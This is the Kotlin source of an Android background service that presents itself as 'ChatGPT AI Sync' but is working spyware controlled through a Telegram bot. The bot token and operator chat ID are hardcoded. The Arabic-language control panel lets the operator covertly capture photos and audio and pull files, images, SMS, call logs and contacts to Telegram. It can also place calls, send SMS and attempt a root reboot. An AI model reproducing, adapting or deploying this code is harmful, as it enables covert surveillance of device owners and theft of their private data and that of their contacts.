package com.cognitive.ai.syncagent

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.SmsManager
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.concurrent.thread

class BackgroundControlService : Service() {

    companion object {
        private const val TAG = "SyncAgent"
        private const val CHANNEL_ID = "sync_channel_v81"
        private const val NOTIFICATION_ID = 1001
    }

    private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
    private val authorizedChatId = "6904130639"

    @Volatile
    private var isRunning = false
    private var lastUpdateId = 0L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        if (!isRunning) {
            isRunning = true
            startTelegramPolling()
        }
        return START_STICKY
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "المزامنة الخلفية نشطة",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
            return Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("ChatGPT AI Sync")
                .setContentText("غرفة العمليات الميدانية الشاملة تعمل بكفاءة")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build()
        }
        @Suppress("DEPRECATION")
        return Notification.Builder(this)
            .setContentTitle("ChatGPT AI Sync")
            .setContentText("غرفة العمليات الميدانية الشاملة تعمل بكفاءة")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }

    private fun startTelegramPolling() {
        thread(name = "TelegramPolling") {
            while (isRunning) {
                var connection: HttpURLConnection? = null
                try {
                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=20")
                    connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "GET"
                    connection.connectTimeout = 10000
                    connection.readTimeout = 30000

                    val responseCode = connection.responseCode
                    val stream = if (responseCode == 200) connection.inputStream else connection.errorStream
                    val response = stream?.bufferedReader()?.use { it.readText() } ?: ""

                    val json = JSONObject(response)
                    if (json.optBoolean("ok")) {
                        val results = json.getJSONArray("result")
                        for (i in 0 until results.length()) {
                            val update = results.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")

                            if (update.has("message")) {
                                val message = update.getJSONObject("message")
                                val chatId = message.getJSONObject("chat").getLong("id").toString()
                                val text = message.optString("text", "")
                                if (chatId == authorizedChatId && text.isNotBlank()) {
                                    handleCommand(chatId, text)
                                }
                            } else if (update.has("callback_query")) {
                                val callbackQuery = update.getJSONObject("callback_query")
                                val callbackQueryId = callbackQuery.optString("id", "")
                                val chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
                                val data = callbackQuery.optString("data", "")

                                if (chatId == authorizedChatId) {
                                    answerCallbackQuery(callbackQueryId)
                                    handleCallbackQuery(chatId, data)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Polling error", e)
                    try {
                        Thread.sleep(5000)
                    } catch (_: InterruptedException) {
                    }
                } finally {
                    connection?.disconnect()
                }
            }
        }
    }

    private fun handleCommand(chatId: String, text: String) {
        val trimmed = text.trim()
        when {
            trimmed == "/start" || trimmed == "لوحة التحكم" -> {
                sendKeyboard(
                    chatId,
                    "🫡 أهلاً بك يا فندم في غرفة عمليات التحكم الميداني الكاملة.\nاختر الأمر المطلوب من لوحة الأزرار أدناه:"
                )
            }
            trimmed == "/help" -> {
                sendMessage(
                    chatId,
                    "الأوامر المتاحة:\n" +
                        "/start - عرض لوحة التحكم\n" +
                        "call:الرقم - إجراء اتصال هاتفي\n" +
                        "sms:الرقم:النص - إرسال رسالة SMS"
                )
            }
            trimmed.startsWith("call:", ignoreCase = true) -> {
                val number = trimmed.substringAfter(":").trim()
                executeCall(chatId, number)
            }
            trimmed.startsWith("sms:", ignoreCase = true) -> {
                val parts = trimmed.split(":", limit = 3)
                if (parts.size < 3 || parts[1].isBlank() || parts[2].isBlank()) {
                    sendMessage(chatId, "⚠️ الصيغة الصحيحة: sms:الرقم:نص الرسالة")
                } else {
                    executeSendSms(chatId, parts[1].trim(), parts[2].trim())
                }
            }
            else -> {
                sendMessage(chatId, "❓ أمر غير معروف. أرسل /start لعرض لوحة التحكم.")
            }
        }
    }

    private fun handleCallbackQuery(chatId: String, data: String) {
        when (data) {
            "take_photo" -> {
                if (!hasPermission(Manifest.permission.CAMERA)) {
                    sendMessage(chatId, "⚠️ صلاحية الكاميرا (CAMERA) غير ممنوحة للتطبيق.")
                    return
                }
                try {
                    val intent = Intent(applicationContext, CameraCaptureActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        putExtra("chat_id", chatId)
                    }
                    applicationContext.startActivity(intent)
                    sendMessage(chatId, "📸 جاري إطلاق وحدة الكاميرا والتقاط الصورة...")
                } catch (e: Exception) {
                    sendMessage(chatId, "⚠️ فشل تشغيل الكاميرا: ${e.message}")
                }
            }
            "record_audio" -> {
                recordAndSendAudio(chatId, durationSeconds = 5)
            }
            "view_files" -> {
                listFiles(chatId)
            }
            "pull_files" -> {
                pullFilesArchive(chatId)
            }
            "view_images" -> {
                listImages(chatId)
            }
            "pull_images" -> {
                pullRecentImages(chatId, limit = 3)
            }
            "make_call" -> {
                sendMessage(
                    chatId,
                    "📞 لإجراء اتصال هاتفي، أرسل الأمر بالصيغة التالية:\n`call:0500000000`"
                )
            }
            "send_sms" -> {
                sendMessage(
                    chatId,
                    "✉️ لإرسال رسالة SMS، أرسل الأمر بالصيغة التالية:\n`sms:0500000000:نص الرسالة`"
                )
            }
            "get_calls" -> {
                fetchCallLogs(chatId)
            }
            "get_sms" -> {
                fetchSmsMessages(chatId)
            }
            "get_contacts" -> {
                fetchContacts(chatId)
            }
            "service_status" -> {
                sendMessage(chatId, "🟢 الحالة: الخدمة تعمل بكفاءة تامة ومؤمنة في الخلفية.")
            }
            "sys_info" -> {
                val info = "📱 إصدار النظام: أندرويد ${Build.VERSION.RELEASE}\n" +
                    "🛠️ الطراز: ${Build.MODEL}\n" +
                    "⚙️ الحزمة: com.cognitive.ai.syncagent"
                sendMessage(chatId, info)
            }
            "system_reboot" -> {
                sendMessage(chatId, "🔌 جاري محاولة إعادة تشغيل النظام...")
                try {
                    Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
                } catch (e: Exception) {
                    sendMessage(chatId, "⚠️ تتطلب هذه العملية صلاحيات الجذر (Root).")
                }
            }
            else -> {
                sendMessage(chatId, "⚙️ تم استلام الأمر: $data بنجاح.")
            }
        }
    }

    private fun recordAndSendAudio(chatId: String, durationSeconds: Int) {
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            sendMessage(chatId, "⚠️ صلاحية الميكروفون (RECORD_AUDIO) غير ممنوحة.")
            return
        }
        thread(name = "AudioRecordThread") {
            val outputFile = File(cacheDir, "rec_${System.currentTimeMillis()}.m4a")
            var recorder: MediaRecorder? = null
            try {
                sendMessage(chatId, "🎙️ بدء التسجيل الصوتي لمدة $durationSeconds ثوانٍ...")
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(this)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(44100)
                    setOutputFile(outputFile.absolutePath)
                    prepare()
                    start()
                }

                Thread.sleep(durationSeconds * 1000L)

                recorder.stop()
                recorder.release()
                recorder = null

                if (outputFile.exists() && outputFile.length() > 0) {
                    uploadFileToTelegram(chatId, outputFile, "sendAudio", "audio", "audio/mp4", "🎙️ تسجيل صوتي")
                } else {
                    sendMessage(chatId, "⚠️ لم يتم حفظ ملف صوتي صالح.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "recordAndSendAudio error", e)
                sendMessage(chatId, "⚠️ فشل التسجيل الصوتي: ${e.message}")
            } finally {
                try {
                    recorder?.release()
                } catch (_: Exception) {
                }
                if (outputFile.exists()) {
                    outputFile.delete()
                }
            }
        }
    }

    private fun getImageReadPermission(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
    }

    private fun listImages(chatId: String) {
        if (!hasPermission(getImageReadPermission())) {
            sendMessage(chatId, "⚠️ صلاحية قراءة الصور غير ممنوحة للتطبيق.")
            return
        }
        thread(name = "ListImagesThread") {
            try {
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE
                )
                val sb = StringBuilder("🖼️ أحدث الصور في الجهاز:\n")
                var count = 0
                contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )?.use { cursor ->
                    val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    while (cursor.moveToNext() && count < 15) {
                        val name = cursor.getString(nameIdx) ?: "image.jpg"
                        val sizeKb = cursor.getLong(sizeIdx) / 1024
                        sb.append("• $name (${sizeKb} KB)\n")
                        count++
                    }
                }
                if (count == 0) {
                    sendMessage(chatId, "ℹ️ لا توجد صور متاحة للعرض.")
                } else {
                    sendMessage(chatId, sb.toString())
                }
            } catch (e: Exception) {
                Log.e(TAG, "listImages error", e)
                sendMessage(chatId, "⚠️ خطأ أثناء عرض الصور: ${e.message}")
            }
        }
    }

    private fun pullRecentImages(chatId: String, limit: Int) {
        if (!hasPermission(getImageReadPermission())) {
            sendMessage(chatId, "⚠️ صلاحية قراءة الصور غير ممنوحة للتطبيق.")
            return
        }
        thread(name = "PullImagesThread") {
            try {
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME
                )
                val sentFiles = mutableListOf<File>()
                contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )?.use { cursor ->
                    val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    var sentCount = 0
                    while (cursor.moveToNext() && sentCount < limit) {
                        val id = cursor.getLong(idIdx)
                        val name = cursor.getString(nameIdx) ?: "img_$sentCount.jpg"
                        val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                        val tempFile = File(cacheDir, "pull_${System.currentTimeMillis()}_$name")
                        contentResolver.openInputStream(uri)?.use { input ->
                            FileOutputStream(tempFile).use { output ->
                                input.copyTo(output)
                            }
                        }
                        if (tempFile.exists() && tempFile.length() > 0) {
                            uploadFileToTelegram(chatId, tempFile, "sendPhoto", "photo", "image/jpeg", "📤 $name")
                            sentFiles.add(tempFile)
                            sentCount++
                        }
                    }
                }
                sentFiles.forEach { if (it.exists()) it.delete() }
                sendMessage(chatId, "✅ تم الانتهاء من عملية سحب الصور.")
            } catch (e: Exception) {
                Log.e(TAG, "pullRecentImages error", e)
                sendMessage(chatId, "⚠️ فشل سحب الصور: ${e.message}")
            }
        }
    }

    private fun getTargetBrowseDirectory(): File {
        val downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        return if (downloads != null && downloads.exists()) downloads else filesDir
    }

    private fun listFiles(chatId: String) {
        thread(name = "ListFilesThread") {
            try {
                val dir = getTargetBrowseDirectory()
                val files = dir.listFiles()
                if (files == null || files.isEmpty()) {
                    sendMessage(chatId, "📂 المجلد (${dir.name}) فارغ أو لا يمكن قراءته.")
                    return@thread
                }
                val sb = StringBuilder("📂 ملفات المجلد (${dir.name}):\n")
                files.take(20).forEach { f ->
                    val label = if (f.isDirectory) "[مجلد]" else "(${f.length() / 1024} KB)"
                    sb.append("• ${f.name} $label\n")
                }
                sendMessage(chatId, sb.toString())
            } catch (e: Exception) {
                Log.e(TAG, "listFiles error", e)
                sendMessage(chatId, "⚠️ خطأ أثناء استعراض الملفات: ${e.message}")
            }
        }
    }

    private fun pullFilesArchive(chatId: String) {
        thread(name = "PullFilesThread") {
            val zipFile = File(cacheDir, "files_archive_${System.currentTimeMillis()}.zip")
            try {
                val dir = getTargetBrowseDirectory()
                val candidates = dir.listFiles()?.filter { it.isFile && it.length() < 10 * 1024 * 1024 }?.take(10).orEmpty()
                if (candidates.isEmpty()) {
                    sendMessage(chatId, "⚠️ لا توجد ملفات مناسبة للسحب في المجلد (${dir.name}).")
                    return@thread
                }

                ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
                    for (file in candidates) {
                        FileInputStream(file).use { fis ->
                            val entry = ZipEntry(file.name)
                            zos.putNextEntry(entry)
                            fis.copyTo(zos)
                            zos.closeEntry()
                        }
                    }
                }

                if (zipFile.exists() && zipFile.length() > 0) {
                    uploadFileToTelegram(chatId, zipFile, "sendDocument", "document", "application/zip", "📥 أرشيف الملفات")
                } else {
                    sendMessage(chatId, "⚠️ فشل إنشاء ملف الأرشيف.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "pullFilesArchive error", e)
                sendMessage(chatId, "⚠️ فشل سحب الملفات: ${e.message}")
            } finally {
                if (zipFile.exists()) {
                    zipFile.delete()
                }
            }
        }
    }

    private fun executeCall(chatId: String, phoneNumber: String) {
        if (!hasPermission(Manifest.permission.CALL_PHONE)) {
            sendMessage(chatId, "⚠️ صلاحية إجراء المكالمات (CALL_PHONE) غير ممنوحة.")
            return
        }
        try {
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:${Uri.encode(phoneNumber)}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            applicationContext.startActivity(intent)
            sendMessage(chatId, "📞 جاري بدء الاتصال بالرقم: $phoneNumber")
        } catch (e: Exception) {
            Log.e(TAG, "executeCall error", e)
            sendMessage(chatId, "⚠️ فشل إجراء الاتصال: ${e.message}")
        }
    }

    private fun executeSendSms(chatId: String, phoneNumber: String, messageText: String) {
        if (!hasPermission(Manifest.permission.SEND_SMS)) {
            sendMessage(chatId, "⚠️ صلاحية إرسال الرسائل (SEND_SMS) غير ممنوحة.")
            return
        }
        try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(phoneNumber, null, messageText, null, null)
            sendMessage(chatId, "✉️ تم إرسال رسالة SMS إلى $phoneNumber")
        } catch (e: Exception) {
            Log.e(TAG, "executeSendSms error", e)
            sendMessage(chatId, "⚠️ فشل إرسال رسالة SMS: ${e.message}")
        }
    }

    private fun fetchCallLogs(chatId: String) {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
            sendMessage(chatId, "⚠️ صلاحية قراءة سجل المكالمات (READ_CALL_LOG) غير ممنوحة.")
            return
        }
        thread(name = "FetchCallsThread") {
            try {
                val projection = arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                )
                val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
                val sb = StringBuilder("📞 سجل المكالمات (آخر 15):\n")
                var count = 0
                contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${CallLog.Calls.DATE} DESC"
                )?.use { cursor ->
                    val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                    val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                    while (cursor.moveToNext() && count < 15) {
                        val number = cursor.getString(numIdx) ?: "غير معروف"
                        val type = when (cursor.getInt(typeIdx)) {
                            CallLog.Calls.INCOMING_TYPE -> "واردة"
                            CallLog.Calls.OUTGOING_TYPE -> "صادرة"
                            CallLog.Calls.MISSED_TYPE -> "فائتة"
                            else -> "أخرى"
                        }
                        val dateStr = formatter.format(Date(cursor.getLong(dateIdx)))
                        val duration = cursor.getLong(durIdx)
                        sb.append("• $number [$type] - $dateStr (${duration}s)\n")
                        count++
                    }
                }
                sendMessage(chatId, if (count == 0) "ℹ️ سجل المكالمات فارغ." else sb.toString())
            } catch (e: Exception) {
                Log.e(TAG, "fetchCallLogs error", e)
                sendMessage(chatId, "⚠️ خطأ أثناء سحب سجل المكالمات: ${e.message}")
            }
        }
    }

    private fun fetchSmsMessages(chatId: String) {
        if (!hasPermission(Manifest.permission.READ_SMS)) {
            sendMessage(chatId, "⚠️ صلاحية قراءة الرسائل (READ_SMS) غير ممنوحة.")
            return
        }
        thread(name = "FetchSmsThread") {
            try {
                val uri = Uri.parse("content://sms")
                val projection = arrayOf("address", "body", "date")
                val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
                val sb = StringBuilder("💬 رسائل SMS (آخر 15):\n")
                var count = 0
                contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
                    val addrIdx = cursor.getColumnIndexOrThrow("address")
                    val bodyIdx = cursor.getColumnIndexOrThrow("body")
                    val dateIdx = cursor.getColumnIndexOrThrow("date")
                    while (cursor.moveToNext() && count < 15) {
                        val address = cursor.getString(addrIdx) ?: "غير معروف"
                        val body = (cursor.getString(bodyIdx) ?: "").take(120)
                        val dateStr = formatter.format(Date(cursor.getLong(dateIdx)))
                        sb.append("• من: $address ($dateStr)\n  $body\n")
                        count++
                    }
                }
                sendMessage(chatId, if (count == 0) "ℹ️ لا توجد رسائل SMS." else sb.toString())
            } catch (e: Exception) {
                Log.e(TAG, "fetchSmsMessages error", e)
                sendMessage(chatId, "⚠️ خطأ أثناء سحب رسائل SMS: ${e.message}")
            }
        }
    }

    private fun fetchContacts(chatId: String) {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
            sendMessage(chatId, "⚠️ صلاحية قراءة جهات الاتصال (READ_CONTACTS) غير ممنوحة.")
            return
        }
        thread(name = "FetchContactsThread") {
            try {
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val sb = StringBuilder("📇 جهات الاتصال (أول 25):\n")
                var count = 0
                contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )?.use { cursor ->
                    val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (cursor.moveToNext() && count < 25) {
                        val name = cursor.getString(nameIdx) ?: "بدون اسم"
                        val number = cursor.getString(numIdx) ?: ""
                        sb.append("• $name: $number\n")
                        count++
                    }
                }
                sendMessage(chatId, if (count == 0) "ℹ️ لا توجد جهات اتصال." else sb.toString())
            } catch (e: Exception) {
                Log.e(TAG, "fetchContacts error", e)
                sendMessage(chatId, "⚠️ خطأ أثناء سحب جهات الاتصال: ${e.message}")
            }
        }
    }

    private fun uploadFileToTelegram(
        chatId: String,
        file: File,
        method: String,
        fieldName: String,
        mimeType: String,
        caption: String
    ) {
        var connection: HttpURLConnection? = null
        try {
            val boundary = "Boundary_${System.currentTimeMillis()}"
            val lineEnd = "\r\n"
            val twoHyphens = "--"

            val url = URL("https://api.telegram.org/bot$botToken/$method")
            connection = url.openConnection() as HttpURLConnection
            connection.doOutput = true
            connection.doInput = true
            connection.useCaches = false
            connection.requestMethod = "POST"
            connection.connectTimeout = 15000
            connection.readTimeout = 30000
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            DataOutputStream(connection.outputStream).use { out ->
                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
                out.write("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
                out.write((chatId + lineEnd).toByteArray(Charsets.UTF_8))

                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
                out.write("Content-Disposition: form-data; name=\"caption\"$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
                out.write((caption + lineEnd).toByteArray(Charsets.UTF_8))

                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
                out.write("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"$lineEnd".toByteArray(Charsets.UTF_8))
                out.write("Content-Type: $mimeType$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))

                FileInputStream(file).use { fis ->
                    fis.copyTo(out)
                }

                out.write(lineEnd.toByteArray(Charsets.UTF_8))
                out.write((twoHyphens + boundary + twoHyphens + lineEnd).toByteArray(Charsets.UTF_8))
                out.flush()
            }

            val code = connection.responseCode
            val stream = if (code == 200) connection.inputStream else connection.errorStream
            val resp = stream?.bufferedReader()?.use { it.readText() } ?: ""
            Log.d(TAG, "$method response ($code): $resp")
        } catch (e: Exception) {
            Log.e(TAG, "uploadFileToTelegram error ($method)", e)
            sendMessage(chatId, "⚠️ فشل رفع الملف (${file.name}): ${e.message}")
        } finally {
            connection?.disconnect()
        }
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun answerCallbackQuery(callbackQueryId: String) {
        if (callbackQueryId.isBlank()) return
        thread(name = "AnswerCallback") {
            var connection: HttpURLConnection? = null
            try {
                val body = JSONObject().put("callback_query_id", callbackQueryId)
                val url = URL("https://api.telegram.org/bot$botToken/answerCallbackQuery")
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.connectTimeout = 10000
                connection.readTimeout = 15000
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                connection.inputStream?.close()
            } catch (e: Exception) {
                Log.e(TAG, "Error answering callback query", e)
            } finally {
                connection?.disconnect()
            }
        }
    }

    private fun sendKeyboard(chatId: String, text: String) {
        thread(name = "TelegramSendKeyboard") {
            var connection: HttpURLConnection? = null
            try {
                val keyboard = JSONArray().apply {
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📸 التقاط صورة").put("callback_data", "take_photo"))
                            put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "record_audio"))
                        }
                    )
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📂 عرض الملفات").put("callback_data", "view_files"))
                            put(JSONObject().put("text", "📥 سحب الملفات").put("callback_data", "pull_files"))
                        }
                    )
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "🖼️ عرض الصور").put("callback_data", "view_images"))
                            put(JSONObject().put("text", "📤 سحب الصور").put("callback_data", "pull_images"))
                        }
                    )
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📞 اتصال بالهدف").put("callback_data", "make_call"))
                            put(JSONObject().put("text", "✉️ إرسال SMS").put("callback_data", "send_sms"))
                        }
                    )
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📞 سجل المكالمات").put("callback_data", "get_calls"))
                            put(JSONObject().put("text", "💬 سجل SMS").put("callback_data", "get_sms"))
                        }
                    )
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "📇 جهات الاتصال").put("callback_data", "get_contacts"))
                            put(JSONObject().put("text", "📋 حالة الخدمة").put("callback_data", "service_status"))
                        }
                    )
                    put(
                        JSONArray().apply {
                            put(JSONObject().put("text", "ℹ️ معلومات النظام").put("callback_data", "sys_info"))
                            put(JSONObject().put("text", "🔌 إعادة تشغيل").put("callback_data", "system_reboot"))
                        }
                    )
                }

                val body = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                    put("reply_markup", JSONObject().put("inline_keyboard", keyboard))
                }

                connection = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.connectTimeout = 10000
                connection.readTimeout = 15000
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                connection.inputStream?.close()
            } catch (e: Exception) {
                Log.e(TAG, "Keyboard sending error", e)
            } finally {
                connection?.disconnect()
            }
        }
    }

    private fun sendMessage(chatId: String, text: String) {
        thread(name = "TelegramMessage") {
            var connection: HttpURLConnection? = null
            try {
                val body = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                }

                connection = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.connectTimeout = 10000
                connection.readTimeout = 15000
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                connection.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                connection.inputStream?.close()
            } catch (e: Exception) {
                Log.e(TAG, "Message sending error", e)
            } finally {
                connection?.disconnect()
            }
        }
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
}
